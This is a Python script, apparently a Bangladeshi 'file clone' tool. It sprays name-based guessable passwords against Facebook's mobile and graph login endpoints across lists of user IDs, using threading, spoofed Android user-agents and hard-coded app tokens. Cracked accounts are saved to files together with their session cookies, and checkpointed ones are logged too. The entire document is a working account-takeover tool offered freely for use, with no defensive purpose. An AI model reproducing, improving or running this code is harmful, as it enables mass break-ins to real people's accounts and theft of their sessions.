#SCRIPTS CREATE BY HABIB HOSSAIN 
#SCRIPTS GIFT FOR EVERYONE
#---------------------● IMPORT ●---------------------#
import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3
from os import path
from urllib.request import urlopen 
import platform,math,smtplib
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print(f'(●) INSTALLING MISSING MODULES ');os.system('pip install requests futures==2 > /dev/null')
except:pass
#---------------------● LOOP ●---------------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];plist = []
#---------------------● COLOUR ●---------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;265m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m"
#---------------------● STYLE ●---------------------#
xd=f"{G}●{W}";xd1=f"{G}● {W}1";xd2=f"{G}● {W}2";xd3=f"{G}● {W}3";xd4=f"{G}● {W}4";xd5=f"{G}● {W}5";xd6=f"{G}● {W}6";xd0=f"{G}● {W}0";xdx=f"{G}● {W}?";xdxx=f"{G}:{W}"
#---------------------● CLEAR ●---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{G}──────────────────────────────────────────────────')
#---------------------● LOGO ●---------------------#
logo=(f"""
   {W} ______         _______ _______ _     _
   {G} |_____] |      |_____| |       |____/ 
   {W} |_____] |_____ |     | |_____  |    \_ 1.0
{G}──────────────────────────────────────────────────
   {W}OWNER {G}:{W} Rabindra {G}|{W} TOOLS {G}:{W} FILE{G}|{W}RANDOM CLONE
{G}──────────────────────────────────────────────────""")
#---------------------● MAIN MENU ●---------------------#
def ___rabindra___():
	clear();print(f"{xd1} START FILE CLONE ");print(f"{xd0} EXISTING CLONE ");linex();option = input(f"{xdx} SELECT {xdxx} ")
	if option in ["1"]:___filex___()
	if option in ["0"]:exit()
	else:linex();print(f"{xd} OPTION NOT FOUND ");linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER");time.sleep(1);___rabindra___()
#---------------------● FILEX ●---------------------#
def ___filex___():
	clear();print(f"{xd} EXAMPLE {xdxx} /sdcard/rabindra.txt");linex();file = input(f"{xdx} ENTER FILE NAME {xdxx} ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{xd} FILE LOCATION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN BROTHER");time.sleep(1);___filex___()
	clear();print(f"{xd1} METHOD {O}>{G}>{W}M1{G}<{O}<");print(f"{xd2} METHOD {O}>{G}>{W}M2{G}<{O}<");print(f"{xd3} METHOD {O}>{G}>{W}M3{G}<{O}<");print(f"{xd4} METHOD {O}>{G}>{W}M4{G}<{O}<");print(f"{xd5} METHOD {O}>{G}>{W}M5{G}<{O}<");linex();methd = input(f"{xdx} SELECT {xdxx} ")
	clear();print(f'{xd} PASSWORD SYSTEM ');linex();print(f'{xd1} AUTO PASSWORD CLONE ONLY BD');print(f'{xd2} CHOICE PASSWORD CLONE');linex();ppp = input(f"{xdx} SELECT {xdxx} ")
	if ppp in ['1','01']:plist.append('first last');plist.append('firstlast');plist.append('first123');plist.append('first1234');plist.append('first12345')
	else:
		try:
			clear();print(f"{xd} EXAMPLE {xdxx} BANGLADESH 5-30 {O}|{W} OTHERS 5-10");linex()
			ps_limit = int(input(f'{xdx} PASSWORDS LIMIT {xdxx} '))
		except:
			ps_limit = 5
		clear();print(f"{xd} EXAMPLE {xdxx} firstlast {G}|{W} first12 {G}|{W} first123 ");linex()
		for i in range(ps_limit):
			plist.append(input(f'{xd} PASSWORD NO{i+1} {xdxx}{G} '))
	with tred(max_workers=30) as __xxx___:
		clear();total_ids = str(len(fo))
		print(f'{xd} TOTAL FILE UID {xdxx}{G} {total_ids} ');print(f"{xd} IF NO RESULT ON{G}|{W}OFF AIRPLANE MODE");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1']:__xxx___.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:__xxx___.submit(___M2___,ids,names,passlist)
			elif methd in ['3']:__xxx___.submit(___M3___,ids,names,passlist)
			elif methd in ['4']:__xxx___.submit(___M4___,ids,names,passlist)
			elif methd in ['5']:__xxx___.submit(___M5___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{G}|{W}CP {xdxx} '+str(len(oks))+'|'+str(len(cps)));linex();exit()
#---------------------● FILE METHOD M1 ●---------------------#
def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} rabindra-M1 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ___M1X___ = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
                        data={"adid": str(uuid.uuid4()),
                                 "format": "json","device_id": str(uuid.uuid4()),
                                 "cpl": "true","family_device_id": str(uuid.uuid4()),
                                 "credentials_type": "device_based_login_password",
                                 "error_detail_type": "button_with_disabled",
                                 "source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=tQP4ZnfotSX1524MpJy3w0K6; sb=tQP4Zt0PgbRHD8bLyaxrqlt1; ps_l=1; ps_n=1; locale=en_GB; vpd=v1%3B960x479x1.2058573961257935; dpr=1.2058573961257935; wl_cbv=v2%3Bclient_version%3A2635%3Btimestamp%3A1727796859; m_pixel_ratio=1.2058573961257935; wd=599x1199; fr=0UvTVsBDUsbm8wrqv.AWXb_H2S6RvFPeVA0nvk21y7rZk.Bm-AO1..AAA.0.0.Bm_Sol.AWUngDCwCXo',
    'dpr': '1.506250023841858',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A045F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● rabindra-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/rabindra-M1-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} rabindra-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/rabindra-M1-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M2 ●---------------------#
def ___M2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} rabindra-M2 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        ___M2X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),
                                   "email": ids,"password": pas,
                                   "generate_analytics_claims": "1",
                                   "credentials_type": "password",
                                   "source": "login","error_detail_type": "button_with_disabled",
                                   "enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive",
                                   "User-Agent": ___M2X___,
                                   "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                   "X-FB-Friendly-Name": "authenticate",
                                   "X-FB-Connection-Type": "unknown",
                                   "Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● rabindra-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/rabindra-M2-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} rabindra-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/rabindra-M2-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M3 ●---------------------#
def ___M3___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} rabindra-M3 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        ___M3X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid':adid,'format':'json','device_id':device_id,
                                   'email':ids,'password':pas,
                                   'generate_analytics_claims':'1',
                                   'credentials_type':'password',
                                   'source':'login','error_detail_type':'button_with_disabled',
                                   'enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
                        headers={'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate',
                                   'X-FB-Connection-Type':'unknown',
                                   'User-Agent':___M3X___,
                                   'Accept-Encoding':'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded',
                                   'X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● rabindra-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/rabindra-M3-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        print(f'\r{G}●{R} rabindra-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/rabindra-M3-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M4 ●---------------------#
def ___M4___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{G}●{W} rabindra-M4 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ___M4X___ = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),
                                   'email':ids,'password':pas,
                                   'generate_analytics_claims':'1',
                                   'community_id':'','cpl':'true','try_num':'1',
                                   'family_device_id':str(uuid.uuid4()),
                                   'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accessToken}
                        headers = {'User-Agent':___M4X___,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com',
                                   'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
                                   'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
                                   'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                   'X-FB-Connection-Type':'WIFI',
                                   'X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{G}● rabindra-OK '+ids+' | '+pas+'\033[1;97m')
                                        print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
                                        open('/sdcard/rabindra-M4-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{G}●{R} rabindra-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/rabindra-M4-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------● FILE METHOD M5 ●---------------------#
def ___M5___(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r{G}●{W} rabindra-M5 %s{G}/{W}%s{G}/{W}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			___M5X___ = "Mozilla/5.0 (Linux; Android 12; RMX2071 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36"
			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ___M5X___, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			xxxp=session.cookies.get_dict().keys()
			if "c_user" in xxxp:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print(f'\r{G}● rabindra-OK '+ids+' | '+pas+'\033[1;97m')
				print(f"\r{G}●{W} COOKIES {G}:{W} "+coki);linex()
				open('/sdcard/rabindra-M5-FILE-OK.txt','a').write(ids+'|'+pas+ '|' +kuki+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in xxxp:
				print(f'\r{G}●{R} rabindra-CP '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/rabindra-M4-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#---------------------> END <---------------------#
___rabindra___()